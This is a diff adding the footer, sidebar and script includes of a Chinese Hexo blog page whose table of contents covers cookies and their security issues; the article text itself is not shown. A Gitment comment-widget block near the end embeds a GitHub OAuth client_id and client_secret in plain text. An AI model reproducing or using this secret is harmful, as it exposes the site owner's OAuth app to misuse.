+                说一说git的几个命令remote、checkout、fetch、pull <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="gitment_container"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="意林">
+          <p class="site-author-name" itemprop="name">意林</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">64</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">89</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shinancao" target="_blank" rel="external nofollow" title="GitHub">
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/3178558825/profile?topnav=1&wvr=6&is_all=1" target="_blank" rel="external nofollow" title="微博">
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.douban.com/people/150971507/" target="_blank" rel="external nofollow" title="豆瓣">
+                  
+                  豆瓣
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#初识cookie"><span class="nav-number">1.</span> <span class="nav-text">初识cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Javascript操作cookie"><span class="nav-number">2.</span> <span class="nav-text">Javascript操作cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie的使用场景"><span class="nav-number">3.</span> <span class="nav-text">cookie的使用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie带来的安全性问题"><span class="nav-number">4.</span> <span class="nav-text">cookie带来的安全性问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie的缺点"><span class="nav-number">5.</span> <span class="nav-text">cookie的缺点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">意林</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io" rel="external nofollow">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" rel="external nofollow">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+	
+		
+		
+		
+		<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+		<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+		<script>
+			var gitment = new Gitment({
+			  //id: '页面 ID',
+			  owner: 'shinancao',
+			  repo: 'shinancao.github.io',
+			  oauth: {
+				client_id: 'd9ac25dfb2084f02efb1',
+				client_secret: '7b127bf1c8bccb72ea55c1220c0db3d3e505672e'
+			  }
+			});
+			gitment.render('gitment_container');
+		</script>
+	
+
+
+  
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
